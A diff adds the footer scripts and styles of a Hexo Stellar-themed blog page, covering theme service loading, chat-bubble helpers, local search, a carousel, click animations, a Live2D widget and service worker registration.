+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+
+<!-- Custom Image Viewer -->
+<script src="/js/plugins/image-viewer.js"></script>
+
+<!-- Custom Context Menu -->
+<script src="/js/plugins/custom-context-menu.js"></script>
+
+<!-- Glitch Effect -->
+<script src="/js/plugins/glitch-effect.js"></script>
+
+<!-- Terminal Copy -->
+<script src="/js/plugins/terminal-copy.js"></script>
+
+<!-- Hotkeys -->
+<script src="/js/plugins/hotkeys.js"></script>
+
+<!-- Achievements / Card System -->
+<script src="/js/plugins/achievements.js"></script>
+
+<!-- Special Days - 节日彩蛋系统 -->
+<script src="/js/plugins/special-days.js"></script>
+
+<!-- Music Player -->
+<script src="/js/plugins/music-player.js"></script>
+
+<!-- Offline Vault - 断网保护机制 -->
+<script src="/js/plugins/offline-vault.js"></script>
+
+<!-- Live2D Widget - Local Version -->
+<script src="/live2d-widget/dist/autoload.js"></script>
+
+<!-- Live2D Widget 位置调整和默认显示 -->
+<style>
+  #waifu {
+    position: fixed !important;
+    bottom: 20px !important;
+    right: 20px !important;
+    left: auto !important;
+    z-index: 1000 !important;
+    transform: none !important;
+    display: block !important;
+    opacity: 1 !important;
+    visibility: visible !important;
+  }
+  #waifu #live2d {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toolbar {
+    position: relative !important;
+    transform: none !important;
+  }
+  #waifu-toggle {
+    display: none !important;
+  }
+</style>
+
+<!-- 点击特效 -->
+<script>
+(function() {
+  var clickEffects = {
+    current: null,
+    
+    init: function() {
+      this.current = localStorage.getItem('clickEffect') || 'none';
+      this.bindEvents();
+    },
+    
+    bindEvents: function() {
+      var self = this;
+      document.addEventListener('click', function(e) {
+        if (self.current === 'none') return;
+        if (e.target.closest('button, a, input, textarea, select, .post-card, .layout-btn')) return;
+        self.createEffect(e.clientX, e.clientY);
+      });
+      
+      window.addEventListener('storage', function(e) {
+        if (e.key === 'clickEffect') {
+          self.current = e.newValue || 'none';
+        }
+      });
+    },
+    
+    createEffect: function(x, y) {
+      switch(this.current) {
+        case 'ripple': this.createRipple(x, y); break;
+        case 'firework': this.createFirework(x, y); break;
+        case 'particles': this.createParticles(x, y); break;
+        case 'text': this.createText(x, y); break;
+        default: break;
+      }
+    },
+    
+    createRipple: function(x, y) {
+      var ripple = document.createElement('div');
+      ripple.className = 'click-ripple';
+      ripple.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:0;height:0;border-radius:50%;background:rgba(52,152,219,0.4);transform:translate(-50%,-50%);pointer-events:none;z-index:9999;animation:rippleExpand 0.6s ease-out forwards;';
+      document.body.appendChild(ripple);
+      setTimeout(function() { ripple.remove(); }, 600);
+    },
+    
+    createFirework: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff'];
+      for (var i = 0; i < 12; i++) {
+        var particle = document.createElement('div');
+        var angle = (Math.PI * 2 / 12) * i;
+        var velocity = 50 + Math.random() * 30;
+        particle.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;width:6px;height:6px;border-radius:50%;background:' + colors[i % 5] + ';pointer-events:none;z-index:9999;transform:translate(-50%,-50%);';
+        document.body.appendChild(particle);
+        this.animateParticle(particle, x, y, x + Math.cos(angle) * velocity, y + Math.sin(angle) * velocity, 500);
+      }
+    },
+    
+    createParticles: function(x, y) {
+      var colors = ['#ff6b6b', '#feca57', '#48dbfb', '#ff9ff3', '#54a0ff', '#5f27cd'];
+      for (var i = 0; i < 8; i++) {
+        var particle = document.createElement('div');
+        particle.innerHTML = '✨';
+        particle.style.cssText = 'position:fixed;left:' + (x + (Math.random()-0.5)*30) + 'px;top:' + (y + (Math.random()-0.5)*30) + 'px;font-size:16px;pointer-events:none;z-index:9999;animation:particleFloat 0.8s ease-out forwards;';
+        document.body.appendChild(particle);
+        setTimeout(function(p) { return function() { p.remove(); }; }(particle), 800);
+      }
+    },
+    
+    createText: function(x, y) {
+      var texts = ['666', '厉害', 'nice', '棒', '赞', '给力'];
+      var text = document.createElement('div');
+      text.innerHTML = texts[Math.floor(Math.random() * texts.length)];
+      text.style.cssText = 'position:fixed;left:' + x + 'px;top:' + y + 'px;font-size:18px;font-weight:bold;color:#3498db;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);animation:textFloat 0.8s ease-out forwards;';
+      document.body.appendChild(text);
+      setTimeout(function() { text.remove(); }, 800);
+    },
+    
+    animateParticle: function(el, startX, startY, endX, endY, duration) {
+      var startTime = performance.now();
+      function animate(currentTime) {
+        var progress = Math.min((currentTime - startTime) / duration, 1);
+        var easeOut = 1 - Math.pow(1 - progress, 3);
+        el.style.left = (startX + (endX - startX) * easeOut) + 'px';
+        el.style.top = (startY + (endY - startY) * easeOut) + 'px';
+        el.style.opacity = 1 - progress;
+        if (progress < 1) requestAnimationFrame(animate);
+        else el.remove();
+      }
+      requestAnimationFrame(animate);
+    }
+  };
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() { clickEffects.init(); });
+  } else {
+    clickEffects.init();
+  }
+  
+  window.ClickEffects = clickEffects;
+})();
+</script>
+
+<style>
+@keyframes rippleExpand {
+  0% { width: 0; height: 0; opacity: 1; }
+  100% { width: 100px; height: 100px; opacity: 0; }
+}
+@keyframes particleFloat {
+  0% { opacity: 1; transform: translateY(0) scale(1); }
+  100% { opacity: 0; transform: translateY(-40px) scale(0.5); }
+}
+@keyframes textFloat {
+  0% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -80px) scale(1.2); }
+}
+</style>
+
+<!-- PWA Service Worker -->
+<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').then(function(reg) {
+    console.log('Service Worker 已注册，支持离线访问');
+  }).catch(function(err) {
+    console.log('Service Worker 注册失败:', err);
+  });
+}
+</script>
+
+<!-- Random Cover Image -->
+<script>
+(function() {
+  function refreshRandomCovers() {
+    var images = document.querySelectorAll('img[src*="loliapi.com"]');
+    images.forEach(function(img) {
+      var src = img.src;
+      var baseSrc = src.split('?')[0];
+      img.src = baseSrc + '?t=' + Date.now() + '&r=' + Math.random().toString(36).substr(2, 9);
+    });
+  }
+  
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', refreshRandomCovers);
+  } else {
+    refreshRandomCovers();
+  }
+})();
+</script>
+
+</div></body></html>
